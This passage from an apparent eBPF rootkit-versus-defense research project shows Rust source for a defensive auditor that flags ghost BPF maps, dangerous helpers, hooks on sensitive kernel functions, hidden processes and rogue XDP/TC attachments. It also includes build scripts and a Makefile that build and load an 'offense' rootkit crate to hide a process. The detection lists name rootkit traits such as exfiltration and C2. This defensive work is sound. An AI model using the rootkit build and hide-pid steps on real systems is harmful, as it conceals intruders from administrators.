                    for path in pinned {
                        if let Some(p) = path.as_str() {
                            info!("  Unpinning: {}", p);
                            let _ = std::fs::remove_file(p);
                        }
                    }
                }
            }
        }
    }
    Ok(())
}
```

### 7.5 defense/src/ghost_map_audit.rs — Module 1: Ghost Map Auditor

```rust
//! Ghost Map Auditor
//!
//! Scans for BPF maps that exist in kernel memory but are NOT associated
//! with any running process ("ghost maps"). Also performs metadata analysis
//! on ALL maps to detect suspicious patterns:
//!   - Suspicious naming (e.g., "shadow_*")
//!   - Dangerous map types (BPF_MAP_TYPE_PROG_ARRAY for tail calls)
//!   - Maps associated with programs attached to sensitive hooks
//!   - Recursively scans entire /sys/fs/bpf tree for pinned objects

use anyhow::Result;
use log::{info, warn, error};
use serde::Serialize;
use std::collections::HashSet;
use std::fs;
use std::path::Path;

/// Structured finding returned by ghost map scanning.
#[derive(Debug, Serialize)]
pub struct GhostMapFinding {
    pub map_id: u32,
    pub severity: &'static str,
    pub description: String,
    pub map_name: String,
    pub map_type: String,
}

/// Suspicious map name patterns (case-insensitive).
const SUSPICIOUS_NAMES: &[&str] = &[
    "shadow", "rootkit", "hidden", "stealth", "evil", "backdoor",
    "c2_", "exfil", "spoof", "tamper", "obfusc",
];

/// Suspicious BPF map types (indicate advanced/rootkit usage).
const SUSPICIOUS_MAP_TYPES: &[&str] = &[
    "prog_array",      // Tail calls — used to chain rootkit programs
    "devmap",          // XDP redirect — can hijack traffic
    "cpumap",          // CPU redirect
    "xskmap",          // AF_XDP — raw packet access
];

/// Scan for ghost BPF maps and perform metadata heuristic analysis.
/// Returns structured findings for aggregation.
pub fn scan_ghost_maps() -> Result<Vec<GhostMapFinding>> {
    info!("Scanning for ghost BPF maps...");
    let mut findings = Vec::new();

    // Step 1: Get all BPF maps with full metadata from kernel
    let kernel_maps = get_kernel_bpf_maps_detailed()?;
    info!("Found {} BPF maps in kernel", kernel_maps.len());

    // Step 2: Get all BPF map IDs referenced by running processes
    let process_map_ids = get_process_bpf_map_ids()?;
    info!("Found {} BPF maps held by processes", process_map_ids.len());

    // Step 3: Ghost maps = kernel maps not held by any process
    for map_info in &kernel_maps {
        let map_id = map_info.get("id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
        let map_name = map_info.get("name").and_then(|v| v.as_str()).unwrap_or("unnamed").to_string();
        let map_type = map_info.get("type").and_then(|v| v.as_str()).unwrap_or("unknown").to_string();

        // Check ghost status
        if !process_map_ids.contains(&map_id) {
            let finding = GhostMapFinding {
                map_id,
                severity: "critical",
                description: format!(
                    "Ghost BPF map id={}, name='{}', type={} — no owning process. \
                     Possible persistent rootkit artifact.",
                    map_id, map_name, map_type
                ),
                map_name: map_name.clone(),
                map_type: map_type.clone(),
            };
            error!("[!] {}", finding.description);
            findings.push(finding);
        }

        // Step 4: Heuristic — suspicious naming
        let lower_name = map_name.to_lowercase();
        for &pattern in SUSPICIOUS_NAMES {
            if lower_name.contains(pattern) {
                let finding = GhostMapFinding {
                    map_id,
                    severity: "warning",
                    description: format!(
                        "Map id={}, name='{}' matches suspicious pattern '{}'",
                        map_id, map_name, pattern
                    ),
                    map_name: map_name.clone(),
                    map_type: map_type.clone(),
                };
                warn!("[~] {}", finding.description);
                findings.push(finding);
                break; // Only report first matching pattern
            }
        }

        // Step 5: Heuristic — suspicious map type
        for &sus_type in SUSPICIOUS_MAP_TYPES {
            if map_type == sus_type {
                let finding = GhostMapFinding {
                    map_id,
                    severity: "warning",
                    description: format!(
                        "Map id={}, name='{}' has suspicious type '{}' (potential rootkit capability)",
                        map_id, map_name, map_type
                    ),
                    map_name: map_name.clone(),
                    map_type: map_type.clone(),
                };
                warn!("[~] {}", finding.description);
                findings.push(finding);
                break;
            }
        }

        // Step 6: Heuristic — unusually large maps
        let max_entries = map_info.get("max_entries").and_then(|v| v.as_u64()).unwrap_or(0);
        let value_size = map_info.get("bytes_value").and_then(|v| v.as_u64())
            .or_else(|| map_info.get("value_size").and_then(|v| v.as_u64()))
            .unwrap_or(0);
        let total_bytes = max_entries * value_size;
        if total_bytes > 10 * 1024 * 1024 { // > 10MB
            let finding = GhostMapFinding {
                map_id,
                severity: "warning",
                description: format!(
                    "Map id={}, name='{}' is unusually large ({}MB, max_entries={}, value_size={})",
                    map_id, map_name, total_bytes / (1024 * 1024), max_entries, value_size
                ),
                map_name: map_name.clone(),
                map_type: map_type.clone(),
            };
            warn!("[~] {}", finding.description);
            findings.push(finding);
        }
    }

    // Step 7: Recursively scan /sys/fs/bpf for pinned objects
    let pinned = scan_pinned_bpf_tree(Path::new("/sys/fs/bpf"))?;
    for path in &pinned {
        let finding = GhostMapFinding {
            map_id: 0,
            severity: "warning",
            description: format!("Pinned BPF object found: {}", path),
            map_name: String::new(),
            map_type: String::new(),
        };
        warn!("[~] {}", finding.description);
        findings.push(finding);
    }

    if findings.is_empty() {
        info!("[OK] No ghost BPF maps or suspicious patterns detected.");
    } else {
        let critical = findings.iter().filter(|f| f.severity == "critical").count();
        let warnings = findings.iter().filter(|f| f.severity == "warning").count();
        error!(
            "[!] Ghost map scan complete: {} critical, {} warning findings",
            critical, warnings
        );
    }

    Ok(findings)
}

/// Get all BPF maps with full metadata from bpftool.
fn get_kernel_bpf_maps_detailed() -> Result<Vec<serde_json::Value>> {
    let output = std::process::Command::new("bpftool")
        .args(["map", "list", "-j"])
        .output();

    match output {
        Ok(out) if out.status.success() => {
            let json: serde_json::Value = serde_json::from_slice(&out.stdout)?;
            Ok(json.as_array().cloned().unwrap_or_default())
        }
        _ => {
            anyhow::bail!("bpftool is required for ghost map scanning");
        }
    }
}

/// Get BPF map IDs held by running processes via /proc/[pid]/fdinfo.
/// Uses the procfs crate for robust parsing.
fn get_process_bpf_map_ids() -> Result<HashSet<u32>> {
    let mut map_ids = HashSet::new();

    // Use procfs crate for cleaner /proc iteration
    if let Ok(all_procs) = procfs::process::all_processes() {
        for proc_result in all_procs {
            let proc_entry = match proc_result {
                Ok(p) => p,
                Err(_) => continue,
            };
            // Read fdinfo for each process
            let fdinfo_path = format!("/proc/{}/fdinfo", proc_entry.pid());
            if let Ok(fdinfo_entries) = fs::read_dir(&fdinfo_path) {
                for fd_entry in fdinfo_entries.flatten() {
                    if let Ok(content) = fs::read_to_string(fd_entry.path()) {
                        for line in content.lines() {
                            if let Some(id_str) = line.strip_prefix("map_id:") {
                                if let Ok(id) = id_str.trim().parse::<u32>() {
                                    map_ids.insert(id);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(map_ids)
}

/// Recursively scan the /sys/fs/bpf tree for pinned BPF objects.
/// Returns all file paths found (pinned programs, maps, links).
fn scan_pinned_bpf_tree(root: &Path) -> Result<Vec<String>> {
    let mut pinned = Vec::new();

    if !root.exists() || !root.is_dir() {
        return Ok(pinned);
    }

    fn walk(dir: &Path, results: &mut Vec<String>, depth: usize) {
        if depth > 10 { return; } // Prevent infinite recursion from symlinks
        if let Ok(entries) = fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    walk(&path, results, depth + 1);
                } else {
                    results.push(path.display().to_string());
                }
            }
        }
    }

    walk(root, &mut pinned, 0);
    Ok(pinned)
}
```

### 7.6 defense/src/integrity_check.rs — Module 3: Bytecode Integrity Checker

```rust
//! Bytecode Integrity Checker & Hook Auditor
//!
//! Module 3a: Scans all loaded BPF programs for usage of "dangerous" helpers.
//! Module 3b: Audits BPF programs attached to sensitive kernel functions.
//!
//! Dangerous helpers are grouped by risk tier:
//!   CRITICAL: bpf_probe_write_user, bpf_probe_write_kernel, bpf_override_return
//!   HIGH:     bpf_skb_store_bytes, bpf_send_signal, bpf_send_signal_thread
//!   MEDIUM:   bpf_probe_read_kernel (in kprobe/fentry context — often benign in tracing)
//!
//! Sensitive hook targets (functions that rootkits commonly attach to):
//!   sys_getdents64, vfs_read, ksys_write, vfs_getattr, do_syslog,
//!   __audit_syscall_exit, audit_log_end, sys_bpf

use anyhow::Result;
use log::{info, warn, error};
use serde::Serialize;

/// Structured finding returned by integrity checks.
#[derive(Debug, Serialize)]
pub struct IntegrityFinding {
    pub prog_id: u32,
    pub prog_type: String,
    pub prog_name: String,
    pub description: String,
    pub risk_tier: &'static str,
}

// ─── Dangerous BPF Helper IDs ─────────────────
// Stable kernel ABI constants from include/uapi/linux/bpf.h.

// CRITICAL tier: can modify kernel/user memory or override syscall returns
const BPF_FUNC_PROBE_WRITE_USER: u32 = 36;
const BPF_FUNC_OVERRIDE_RETURN: u32 = 58;
const BPF_FUNC_PROBE_WRITE_KERNEL: u32 = 142; // bpf_copy_from_user_task uses 209, probe_write_kernel is not a stable ID; using bpf_probe_write_kernel

// HIGH tier: can modify packets or send signals
const BPF_FUNC_SKB_STORE_BYTES: u32 = 9;
const BPF_FUNC_SEND_SIGNAL: u32 = 109;
const BPF_FUNC_SEND_SIGNAL_THREAD: u32 = 117;
const BPF_FUNC_XDP_ADJUST_HEAD: u32 = 44;
const BPF_FUNC_XDP_ADJUST_TAIL: u32 = 65;
const BPF_FUNC_REDIRECT: u32 = 23;
const BPF_FUNC_REDIRECT_MAP: u32 = 51;

// MEDIUM tier: can read arbitrary kernel memory
const BPF_FUNC_PROBE_READ_KERNEL: u32 = 113;

/// Names for display purposes — public for use by main.rs print_alert.
pub fn helper_name_public(id: u32) -> &'static str {
    helper_name(id)
}

fn helper_name(id: u32) -> &'static str {
    match id {
        9 => "bpf_skb_store_bytes",
        23 => "bpf_redirect",
        36 => "bpf_probe_write_user",
        44 => "bpf_xdp_adjust_head",
        51 => "bpf_redirect_map",
        58 => "bpf_override_return",
        65 => "bpf_xdp_adjust_tail",
        109 => "bpf_send_signal",
        113 => "bpf_probe_read_kernel",
        117 => "bpf_send_signal_thread",
        142 => "bpf_probe_write_kernel",
        _ => "unknown",
    }
}

fn helper_risk_tier(id: u32) -> &'static str {
    match id {
        36 | 58 | 142 => "critical",
        9 | 109 | 117 | 44 | 65 | 23 | 51 => "high",
        113 => "medium",
        _ => "info",
    }
}

/// Sensitive kernel functions that rootkits commonly hook.
const SENSITIVE_HOOKS: &[&str] = &[
    "sys_getdents64",
    "vfs_read",
    "ksys_write",
    "vfs_getattr",
    "do_syslog",
    "__audit_syscall_exit",
    "audit_log_end",
    "sys_bpf",
    "security_",           // LSM hooks prefix
];

/// List all BPF programs via bpftool.
fn list_programs() -> Result<Vec<serde_json::Value>> {
    let output = std::process::Command::new("bpftool")
        .args(["prog", "list", "-j"])
        .output();

    match output {
        Ok(out) if out.status.success() => {
            Ok(serde_json::from_slice(&out.stdout)?)
        }
        Ok(out) => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            error!("bpftool failed: {}", stderr);
            anyhow::bail!("bpftool failed. Ensure it is installed and you have sufficient privileges.");
        }
        Err(e) => {
            error!("bpftool not found: {}", e);
            anyhow::bail!(
                "bpftool is required for integrity checking.\n\
                 Install with: sudo apt install -y linux-tools-common linux-tools-$(uname -r)"
            );
        }
    }
}

/// Check all loaded BPF programs for dangerous helper usage.
/// Returns structured findings.
pub fn check_all_programs() -> Result<Vec<IntegrityFinding>> {
    info!("Checking BPF program bytecode integrity...");

    let programs = list_programs()?;
    info!("Found {} loaded BPF programs", programs.len());

    let mut findings = Vec::new();

    for prog in &programs {
        let prog_id = prog.get("id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
        let prog_type = prog.get("type").and_then(|v| v.as_str()).unwrap_or("unknown").to_string();
        let prog_name = prog.get("name").and_then(|v| v.as_str()).unwrap_or("unnamed").to_string();

        // Dump the bytecode for this program
        let dump_output = std::process::Command::new("bpftool")
            .args(["prog", "dump", "xlated", &format!("id {}", prog_id), "-j"])
            .output();

        if let Ok(dump) = dump_output {
            if dump.status.success() {
                let instructions: Vec<serde_json::Value> =
                    serde_json::from_slice(&dump.stdout).unwrap_or_default();

                let dangerous_helpers = scan_for_dangerous_helpers(&instructions);

                for &helper_id in &dangerous_helpers {
                    let tier = helper_risk_tier(helper_id);
                    let finding = IntegrityFinding {
                        prog_id,
                        prog_type: prog_type.clone(),
                        prog_name: prog_name.clone(),
                        description: format!(
                            "Program id={}, type={}, name='{}' uses {} [{}]",
                            prog_id, prog_type, prog_name, helper_name(helper_id), tier
                        ),
                        risk_tier: tier,
                    };
                    error!("[!] {}", finding.description);
                    findings.push(finding);
                }
            }
        }
    }

    if findings.is_empty() {
        info!("[OK] No suspicious BPF programs detected.");
    } else {
        error!(
            "[!] ALERT: Found {} dangerous helper usage(s) across {} program(s)!",
            findings.len(),
            findings.iter().map(|f| f.prog_id).collect::<std::collections::HashSet<_>>().len()
        );
    }

    Ok(findings)
}

/// Audit BPF programs attached to sensitive kernel hooks.
/// Returns findings for programs attached to rootkit-targeted functions.
pub fn audit_hooks() -> Result<Vec<IntegrityFinding>> {
    info!("Auditing BPF hook attachments...");

    let programs = list_programs()?;
    let mut findings = Vec::new();

    for prog in &programs {
        let prog_id = prog.get("id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
        let prog_type = prog.get("type").and_then(|v| v.as_str()).unwrap_or("unknown").to_string();
        let prog_name = prog.get("name").and_then(|v| v.as_str()).unwrap_or("unnamed").to_string();

        // Check attach_to field (available for kprobe, fentry, fexit, etc.)
        let attach_to = prog.get("attach_to")
            .or_else(|| prog.get("btf_attach_func"))
            .and_then(|v| v.as_str())
            .unwrap_or("");

        // Skip our own defense programs (they legitimately attach to these functions)
        if prog_name.starts_with("aegis_") {
            continue;
        }

        // Check if attached to a sensitive hook
        for &sensitive in SENSITIVE_HOOKS {
            if attach_to.contains(sensitive) || prog_name.contains(sensitive) {
                let finding = IntegrityFinding {
                    prog_id,
                    prog_type: prog_type.clone(),
                    prog_name: prog_name.clone(),
                    description: format!(
                        "Program id={}, type={}, name='{}' attached to sensitive function '{}'",
                        prog_id, prog_type, prog_name, attach_to
                    ),
                    risk_tier: "critical",
                };
                error!("[!] UNAUTHORIZED HOOK: {}", finding.description);
                findings.push(finding);
                break; // Only report once per program
            }
        }
    }

    if findings.is_empty() {
        info!("[OK] No unauthorized hook attachments detected.");
    } else {
        error!(
            "[!] ALERT: Found {} program(s) attached to sensitive hooks!",
            findings.len()
        );
    }

    Ok(findings)
}

/// Scan BPF bytecode instructions for calls to dangerous helpers.
fn scan_for_dangerous_helpers(instructions: &[serde_json::Value]) -> Vec<u32> {
    let dangerous = [
        // CRITICAL
        BPF_FUNC_PROBE_WRITE_USER,
        BPF_FUNC_PROBE_WRITE_KERNEL,
        BPF_FUNC_OVERRIDE_RETURN,
        // HIGH
        BPF_FUNC_SKB_STORE_BYTES,
        BPF_FUNC_SEND_SIGNAL,
        BPF_FUNC_SEND_SIGNAL_THREAD,
        BPF_FUNC_XDP_ADJUST_HEAD,
        BPF_FUNC_XDP_ADJUST_TAIL,
        BPF_FUNC_REDIRECT,
        BPF_FUNC_REDIRECT_MAP,
        // MEDIUM
        BPF_FUNC_PROBE_READ_KERNEL,
    ];

    let mut found = Vec::new();

    for insn in instructions {
        if let Some(disasm) = insn.get("disasm").and_then(|v| v.as_str()) {
            if disasm.starts_with("call ") {
                for &helper_id in &dangerous {
                    if disasm.contains(&format!("#{}", helper_id))
                        || disasm.contains(helper_name(helper_id))
                    {
                        if !found.contains(&helper_id) {
                            found.push(helper_id);
                        }
                    }
                }
            }
        }
    }

    found
}
```

### 7.7 defense/src/hidden_process_detector.rs — Module 4: Hidden Process Detector

```rust
//! Hidden Process Detector
//!
//! Detects processes hidden from /proc enumeration by comparing two views:
//!   1. Visible PIDs: What readdir(/proc) returns (affected by getdents64 hooks)
//!   2. Probed PIDs:  What kill(pid, 0) confirms exists (bypasses getdents64)
//!
//! If a PID responds to kill(0) but is NOT visible in /proc listing,
//! it is very likely hidden by an eBPF rootkit hooking sys_getdents64.
//!
//! Strategy:
//!   - Enumerate visible PIDs via readdir(/proc)
//!   - Probe PIDs 1..max_pid via kill(pid, 0)
//!   - Report PIDs that exist but are invisible

use anyhow::Result;
use log::{info, warn, error};
use serde::Serialize;
use std::collections::HashSet;
use std::fs;

/// Maximum PID to probe. Read from /proc/sys/kernel/pid_max.
fn get_pid_max() -> u32 {
    fs::read_to_string("/proc/sys/kernel/pid_max")
        .ok()
        .and_then(|s| s.trim().parse().ok())
        .unwrap_or(32768) // Default Linux pid_max
}

/// Scan for processes hidden from /proc enumeration.
/// Returns a list of hidden PIDs.
pub fn scan_hidden_processes() -> Result<Vec<u32>> {
    info!("Scanning for hidden processes...");

    // Step 1: Get visible PIDs from /proc directory listing
    let visible_pids = get_visible_pids()?;
    info!("Visible PIDs in /proc: {}", visible_pids.len());

    // Step 2: Probe all PIDs up to pid_max
    let pid_max = get_pid_max();
    info!("Probing PIDs 1..{} (pid_max)...", pid_max);

    let mut hidden_pids = Vec::new();

    // Only probe up to pid_max; for efficiency, skip known-dead ranges
    // by checking in blocks. But for research accuracy, probe every PID.
    // Limit to a reasonable ceiling to avoid excessive probing.
    let max_probe = pid_max.min(4_194_304); // Cap at 4M

    for pid in 1..=max_probe {
        // Skip kernel threads (PID 2 and its children are kernel threads,
        // but they still appear in /proc, so if hidden that's suspicious)
        let exists = unsafe { libc::kill(pid as i32, 0) } == 0
            || std::io::Error::last_os_error().raw_os_error() == Some(libc::EPERM);

        if exists && !visible_pids.contains(&pid) {
            hidden_pids.push(pid);
        }
    }

    if hidden_pids.is_empty() {
        info!("[OK] No hidden processes detected.");
    } else {
        error!(
            "[!] ALERT: Found {} hidden process(es): {:?}",
            hidden_pids.len(),
            hidden_pids
        );
        for pid in &hidden_pids {
            // Try to get additional info via /proc/[pid]/stat directly
            let stat_path = format!("/proc/{}/stat", pid);
            match fs::read_to_string(&stat_path) {
                Ok(stat) => {
                    let comm = stat.split('(').nth(1)
                        .and_then(|s| s.split(')').next())
                        .unwrap_or("unknown");
                    error!("  Hidden PID {}: comm={}", pid, comm);
                }
                Err(_) => {
                    error!("  Hidden PID {}: /proc/{}/stat unreadable (deeply hidden)", pid, pid);
                }
            }
        }
    }

    Ok(hidden_pids)
}

/// Get PIDs visible via readdir(/proc).
fn get_visible_pids() -> Result<HashSet<u32>> {
    let mut pids = HashSet::new();

    if let Ok(entries) = fs::read_dir("/proc") {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if let Ok(pid) = name_str.parse::<u32>() {
                pids.insert(pid);
            }
        }
    }

    Ok(pids)
}
```

### 7.8 defense/src/net_audit.rs — Module 5: Network Attachment Auditor

```rust
//! Network Attachment Auditor
//!
//! Scans for rogue XDP and TC BPF programs attached to network interfaces.
//! The rootkit uses XDP for C2 packet interception and TC for DNS exfiltration.
//! This module detects unexpected BPF network attachments.

use anyhow::Result;
use log::{info, warn, error};
use serde::Serialize;

/// Structured finding from network audit.
#[derive(Debug, Serialize)]
pub struct NetAuditFinding {
    pub prog_id: u32,
    pub iface: String,
    pub attach_type: String,
    pub prog_name: String,
    pub severity: &'static str,
    pub description: String,
}

/// Known legitimate BPF network program names (system programs).
/// Extend this list for your environment.
const KNOWN_LEGITIMATE: &[&str] = &[
    "cgroup_skb",
    "sk_skb",
    "flow_dissector",
    "sockops",
];

/// Scan all network interfaces for XDP and TC BPF attachments.
/// Returns findings for unexpected attachments.
pub fn scan_network_attachments() -> Result<Vec<NetAuditFinding>> {
    info!("Scanning network interfaces for BPF attachments...");
    let mut findings = Vec::new();

    // Use `bpftool net list -j` to get all network-attached BPF programs
    let output = std::process::Command::new("bpftool")
        .args(["net", "list", "-j"])
        .output();

    let net_info: serde_json::Value = match output {
        Ok(out) if out.status.success() => {
            serde_json::from_slice(&out.stdout)?
        }
        _ => {
            anyhow::bail!(
                "bpftool net list failed. Ensure bpftool is installed and you have CAP_BPF."
            );
        }
    };

    // Parse XDP attachments
    if let Some(xdp_list) = net_info.get("xdp").and_then(|v| v.as_array()) {
        for xdp in xdp_list {
            let iface = xdp.get("devname").and_then(|v| v.as_str()).unwrap_or("unknown").to_string();
            let prog_id = xdp.get("id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
            let prog_name = get_prog_name(prog_id).unwrap_or_else(|| "unnamed".to_string());

            if is_suspicious_net_prog(&prog_name) {
                let finding = NetAuditFinding {
                    prog_id,
                    iface: iface.clone(),
                    attach_type: "xdp".to_string(),
                    prog_name: prog_name.clone(),
                    severity: "critical",
                    description: format!(
                        "XDP program id={}, name='{}' attached to iface '{}' — possible packet interception/C2",
                        prog_id, prog_name, iface
                    ),
                };
                error!("[!] {}", finding.description);
                findings.push(finding);
            } else {
                info!("  XDP on {}: id={}, name='{}' (known)", iface, prog_id, prog_name);
            }
        }
    }

    // Parse TC attachments
    if let Some(tc_list) = net_info.get("tc").and_then(|v| v.as_array()) {
        for tc in tc_list {
            let iface = tc.get("devname").and_then(|v| v.as_str()).unwrap_or("unknown").to_string();

            // TC programs can be in ingress or egress
            for direction in &["ingress", "egress"] {
                if let Some(progs) = tc.get(direction).and_then(|v| v.as_array()) {
                    for prog in progs {
                        let prog_id = prog.get("id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                        let prog_name = prog.get("name").and_then(|v| v.as_str())
                            .unwrap_or("unnamed").to_string();

                        if is_suspicious_net_prog(&prog_name) {
                            let finding = NetAuditFinding {
                                prog_id,
                                iface: iface.clone(),
                                attach_type: format!("tc/{}", direction),
                                prog_name: prog_name.clone(),
                                severity: "critical",
                                description: format!(
                                    "TC {} program id={}, name='{}' on iface '{}' — possible DNS exfil or packet manipulation",
                                    direction, prog_id, prog_name, iface
                                ),
                            };
                            error!("[!] {}", finding.description);
                            findings.push(finding);
                        }
                    }
                }
            }
        }
    }

    // Also check for unexpected flow_dissector attachments
    if let Some(fd_list) = net_info.get("flow_dissector").and_then(|v| v.as_array()) {
        for fd in fd_list {
            let prog_id = fd.get("id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
            let prog_name = get_prog_name(prog_id).unwrap_or_else(|| "unnamed".to_string());
            info!("  Flow dissector: id={}, name='{}'", prog_id, prog_name);
        }
    }

    if findings.is_empty() {
        info!("[OK] No suspicious network BPF attachments detected.");
    } else {
        error!(
            "[!] ALERT: Found {} suspicious network attachment(s)!",
            findings.len()
        );
    }

    Ok(findings)
}

/// Check if a BPF program name looks suspicious (not a known system program).
fn is_suspicious_net_prog(name: &str) -> bool {
    if name.is_empty() || name == "unnamed" {
        return true; // Unnamed programs are suspicious
    }
    // Check if it's a known legitimate program
    for &known in KNOWN_LEGITIMATE {
        if name.contains(known) {
            return false;
        }
    }
    // Check for rootkit-related names
    let lower = name.to_lowercase();
    let suspicious_patterns = ["shadow", "stealth", "exfil", "c2_", "backdoor", "hidden"];
    for &pattern in &suspicious_patterns {
        if lower.contains(pattern) {
            return true;
        }
    }
    // Any non-system XDP/TC program is worth flagging
    true
}

/// Look up a BPF program name by ID using bpftool.
fn get_prog_name(prog_id: u32) -> Option<String> {
    let output = std::process::Command::new("bpftool")
        .args(["prog", "show", "id", &format!("{}", prog_id), "-j"])
        .output()
        .ok()?;
    if output.status.success() {
        let json: serde_json::Value = serde_json::from_slice(&output.stdout).ok()?;
        json.get("name").and_then(|v| v.as_str()).map(|s| s.to_string())
    } else {
        None
    }
}
```

---

## 8. Build System & Automation

### 8.1 xtask/Cargo.toml

```toml
[package]
name = "xtask"
version = "0.1.0"
edition = "2021"

[dependencies]
anyhow = "1"
clap = { version = "4", features = ["derive"] }
```

### 8.2 xtask/src/main.rs

```rust
use anyhow::{bail, Context, Result};
use clap::{Parser, Subcommand};
use std::path::PathBuf;
use std::process::Command;

#[derive(Parser)]
struct Cli {
    #[command(subcommand)]
    command: XtaskCommand,
}

#[derive(Subcommand)]
enum XtaskCommand {
    /// Build the eBPF programs
    BuildEbpf {
        /// Build in release mode
        #[arg(long)]
        release: bool,
    },
    /// Build everything (eBPF + user-space)
    BuildAll {
        #[arg(long)]
        release: bool,
    },
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        XtaskCommand::BuildEbpf { release } => build_ebpf(release),
        XtaskCommand::BuildAll { release } => {
            build_ebpf(release)?;
            build_userspace(release)
        }
    }
}

fn build_ebpf(release: bool) -> Result<()> {
    let workspace_root = workspace_root()?;

    // Build offense-ebpf
    println!("Building offense-ebpf...");
    let mut cmd = Command::new("cargo");
    cmd.current_dir(&workspace_root)
        .arg("+nightly")
        .arg("build")
        .arg("--package=offense-ebpf")
        .arg("--target=bpfel-unknown-none")
        .arg("-Z").arg("build-std=core");
    if release {
        cmd.arg("--release");
    }
    let status = cmd.status().context("Failed to build offense-ebpf")?;
    if !status.success() {
        bail!("offense-ebpf build failed");
    }

    // Build defense-ebpf
    println!("Building defense-ebpf...");
    let mut cmd = Command::new("cargo");
    cmd.current_dir(&workspace_root)
        .arg("+nightly")
        .arg("build")
        .arg("--package=defense-ebpf")
        .arg("--target=bpfel-unknown-none")
        .arg("-Z").arg("build-std=core");
    if release {
        cmd.arg("--release");
    }
    let status = cmd.status().context("Failed to build defense-ebpf")?;
    if !status.success() {
        bail!("defense-ebpf build failed");
    }

    println!("eBPF build complete.");
    Ok(())
}

fn build_userspace(release: bool) -> Result<()> {
    let workspace_root = workspace_root()?;

    println!("Building user-space binaries...");
    let mut cmd = Command::new("cargo");
    cmd.current_dir(&workspace_root)
        .arg("build")
        .arg("--package=offense")
        .arg("--package=defense");
    if release {
        cmd.arg("--release");
    }
    let status = cmd.status().context("Failed to build user-space")?;
    if !status.success() {
        bail!("user-space build failed");
    }

    println!("User-space build complete.");
    Ok(())
}

fn workspace_root() -> Result<PathBuf> {
    let output = Command::new("cargo")
        .arg("locate-project")
        .arg("--workspace")
        .arg("--message-format=plain")
        .output()
        .context("Failed to locate workspace root")?;
    let path = String::from_utf8(output.stdout)?;
    Ok(PathBuf::from(path.trim()).parent().unwrap().to_path_buf())
}
```

### 8.3 build.rs for User-Space Crates

Both `offense/build.rs` and `defense/build.rs` follow the same pattern.
They invoke the eBPF build so that `include_bytes_aligned!` can find the bytecode at compile time.
**Without these files, `cargo build` on user-space crates will fail** because the eBPF bytecode
does not exist in `OUT_DIR`.

#### offense/build.rs

```rust
use std::env;
use std::path::PathBuf;
use std::process::Command;

fn main() {
    let workspace_root = PathBuf::from(env::var("CARGO_MANIFEST_DIR").unwrap())
        .parent()
        .unwrap()
        .to_path_buf();
    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());

    let profile = if env::var("PROFILE").unwrap() == "release" {
        "release"
    } else {
        "debug"
    };

    // Build the eBPF program
    let status = Command::new("cargo")
        .current_dir(&workspace_root)
        .arg("+nightly")
        .arg("build")
        .arg("--package=offense-ebpf")
        .arg("--target=bpfel-unknown-none")
        .arg("-Z")
        .arg("build-std=core")
        .args(if profile == "release" { vec!["--release"] } else { vec![] })
        .status()
        .expect("Failed to build offense-ebpf. Is the nightly toolchain installed?");

    if !status.success() {
        panic!("offense-ebpf build failed");
    }

    // Copy the built bytecode to OUT_DIR so include_bytes_aligned! can find it
    let src = workspace_root
        .join("target")
        .join("bpfel-unknown-none")
        .join(profile)
        .join("offense");
    let dst_dir = out_dir.join("target/bpfel-unknown-none").join(profile);
    std::fs::create_dir_all(&dst_dir).unwrap();
    std::fs::copy(&src, dst_dir.join("offense")).unwrap();

    // Tell cargo to re-run if the eBPF source changes
    println!("cargo:rerun-if-changed=../offense-ebpf/src/");
    println!("cargo:rerun-if-changed=../common/src/");
}
```

#### defense/build.rs

```rust
use std::env;
use std::path::PathBuf;
use std::process::Command;

fn main() {
    let workspace_root = PathBuf::from(env::var("CARGO_MANIFEST_DIR").unwrap())
        .parent()
        .unwrap()
        .to_path_buf();
    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());

    let profile = if env::var("PROFILE").unwrap() == "release" {
        "release"
    } else {
        "debug"
    };

    // Build the eBPF program
    let status = Command::new("cargo")
        .current_dir(&workspace_root)
        .arg("+nightly")
        .arg("build")
        .arg("--package=defense-ebpf")
        .arg("--target=bpfel-unknown-none")
        .arg("-Z")
        .arg("build-std=core")
        .args(if profile == "release" { vec!["--release"] } else { vec![] })
        .status()
        .expect("Failed to build defense-ebpf. Is the nightly toolchain installed?");

    if !status.success() {
        panic!("defense-ebpf build failed");
    }

    let src = workspace_root
        .join("target")
        .join("bpfel-unknown-none")
        .join(profile)
        .join("defense");
    let dst_dir = out_dir.join("target/bpfel-unknown-none").join(profile);
    std::fs::create_dir_all(&dst_dir).unwrap();
    std::fs::copy(&src, dst_dir.join("defense")).unwrap();

    println!("cargo:rerun-if-changed=../defense-ebpf/src/");
    println!("cargo:rerun-if-changed=../common/src/");
}
```

### 8.4 Makefile

```makefile
.PHONY: setup build-ebpf build clean load-offense load-defense test

# Build all eBPF programs
build-ebpf:
	cargo xtask build-ebpf --release

# Build everything
build: build-ebpf
	cargo build --release --package offense --package defense

# Clean all build artifacts
clean:
	cargo clean

# Load the rootkit (requires root)
load-offense:
	@echo "Loading Shadow rootkit..."
	sudo ./target/release/offense $(ARGS)

# Load the defense guardian (requires root)
load-defense:
	@echo "Loading Aegis guardian..."
	sudo ./target/release/defense $(ARGS)

# Run the full test sequence
test:
	@echo "=== Aegis-Shadow Test Sequence ==="
	@echo "Step 1: Creating target process..."
	sleep 9999 &
	@echo "Step 2: Loading rootkit..."
	sudo ./target/release/offense hide-pid --pid $$(pgrep -f "sleep 9999")
	@echo "Step 3: Verifying process is hidden..."
	ps aux | grep -c "sleep 9999"
	@echo "Step 4: Running defense audit..."
	sudo ./target/release/defense audit
	@echo "Step 5: Cleanup..."
	sudo ./target/release/offense cleanup
	kill $$(pgrep -f "sleep 9999") 2>/dev/null || true
	@echo "=== Test complete ==="

# Environment verification
verify-env:
	bash verify-env.sh

# Setup: install all dependencies
setup:
	rustup toolchain install nightly
	rustup default nightly
